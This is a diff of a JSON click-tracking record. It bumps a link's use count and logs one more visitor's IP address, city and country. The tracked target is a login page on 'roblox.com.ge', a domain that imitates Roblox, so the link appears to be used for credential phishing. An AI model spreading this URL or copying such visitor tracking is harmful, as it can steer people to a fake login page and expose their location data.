@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1161,
+    "useCount": 1162,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9432,6 +9432,14 @@
         "city": "Ajman",
         "flag": "🇦🇪",
         "countryCode": "AE"
+      },
+      {
+        "timestamp": 1777288623920,
+        "ip": "115.133.214.120",
+        "country": "Malaysia",
+        "city": "Kota Kinabalu",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
